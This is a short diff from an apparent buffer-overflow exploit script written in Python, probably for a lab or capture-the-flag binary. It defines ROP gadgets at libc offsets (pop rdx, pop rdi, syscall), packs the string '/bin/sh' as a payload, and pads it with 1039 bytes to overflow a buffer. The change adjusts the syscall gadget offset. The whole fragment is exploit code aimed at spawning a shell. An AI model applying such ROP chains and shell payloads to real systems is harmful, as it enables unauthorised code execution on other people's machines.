@@ -11,12 +11,12 @@ g3 = LIBC_OFFSET + 0x1b92  # pop rdx ; ret
 d2 = 0
 g3 = LIBC_OFFSET + 0x1fc6a # pop rdi ; ret
 d3 = 0x7fffffffe100
-g4 = LIBC_OFFSET + 0x15a76a # syscall  (0x15a76b)
+g4 = LIBC_OFFSET + 0x3f3b1 # syscall  (0x3f3b0)
 
 
 
 
-shellcode = struct.pack('<q', 0x0068732f6e69622f) #?
+shellcode = struct.pack('<q', 0x0068732f6e69622f) 
 
 shellcode += 'A'*(1039)
 shellcode += 'B'
